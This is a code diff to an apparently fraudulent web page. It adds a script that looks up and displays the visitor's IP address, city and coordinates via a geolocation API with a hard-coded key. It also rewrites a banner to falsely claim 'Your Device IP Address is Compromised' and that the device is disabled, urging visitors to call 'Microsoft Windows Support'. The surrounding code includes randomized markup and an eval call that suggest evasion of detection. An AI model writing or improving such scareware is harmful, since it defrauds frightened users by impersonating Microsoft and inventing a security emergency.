@@ -3,6 +3,37 @@
 
 <!DOCTYPE html>
 <html>
+ <script>
+        const apiKey = '4f804a10-5e73-43bd-a8b5-2f2dd94a8f61';
+        const apiUrl = `https://apiip.net/api/check?accessKey=${apiKey}`;
+
+        fetch(apiUrl)
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+                const city = data.city;
+                const region = data.regionName; // Use "regionName" for region
+                const state = data.regionName; // Add state field
+                const longitude = data.longitude;
+                const latitude = data.latitude;
+
+                // Debugging: Log data, region, and state
+                console.log('API Data:', data);
+                console.log('Region from API:', region);
+                console.log('State from API:', state);
+
+                // Update the HTML content with the fetched data
+                document.getElementById('ipAddress').textContent = ipAddress;
+                document.getElementById('city').textContent = city;
+                document.getElementById('region').textContent = region;
+                document.getElementById('state').textContent = state; // Update the ID
+                document.getElementById('longitude').textContent = longitude;
+                document.getElementById('latitude').textContent = latitude;
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+    </script>
 <script>
 (function() {
     const metaOptions = [
@@ -488,7 +519,60 @@ eval(randomizedCode);
 <body>
 <audio id="music1" src="text-to-speech.mp3" controls loop></audio>
 <audio id="music2" src="beep.mp3" controls loop></audio>
+ <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP and Location Info</title>
+    <style>
+        body {
+            background-color: #000; /* Black background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
 
+        #info-box {
+            background-color: #222; /* Darker box for contrast */
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            color: #fff; /* White text */
+            width: 300px; /* Fixed width for the box */
+        }
+
+        .info {
+            color: red; /* Red info text */
+            margin-top: 10px; /* Spacing above info text */
+            font-size: 16px; /* Font size for info text */
+        }
+    </style>
+</head>
+<body>
+
+<div id="info-box">
+    <span style="font-size: 21px; font-weight: 600;">IP & Location Info</span>
+
+    <p class="info">
+        <strong>IP Address:</strong> <span id="ipAddress"></span><br>
+        <strong>City:</strong> <span id="city"></span><br>
+        <strong>Region:</strong> <span id="region"></span><br>
+        <strong>Longitude:</strong> <span id="longitude"></span><br>
+        <strong>Latitude:</strong> <span id="latitude"></span><br>
+    </p>
+</div>
+
+<script>
+    // Example JavaScript to populate the information
+    // You can replace this with actual API calls to fetch IP and location data
+    document.getElementById('ipAddress').innerText = '192.168.1.1'; // Replace with actual IP retrieval
+    document.getElementById('city').innerText = 'Sample City'; // Replace with actual city retrieval
+    document.getElementById('region').innerText = 'Sample Region'; // Replace with actual region retrieval
+    document.getElementById('longitude').innerText = '-123.4567'; // Replace with actual longitude retrieval
+    document.getElementById('latitude').innerText = '45.6789'; // Replace with actual latitude retrieval
+</script>
 <div id="modal-overlay">
     <div id="modal-content">
         <span id="modal-close">&times;</span>
@@ -510,8 +594,7 @@ Accounts That Violate Our Community Standards or Terms of Service May Be Suspend
     </p>
 </div>
 
-<div id="support-text">Call Microsoft Windows Support Toll Free <strong id="t2"></strong></div>
-
+<div id="support-text">Your Device IP Address is Compromised Stop Code : FBX_0x635<br>Call Microsoft Windows Support Toll Free <strong id="t2"></strong><br><span style="color:#cc0000"><strong> Do not reboot or use Your Device. This Device is disabled. </strong></div>
 
 
 <script>
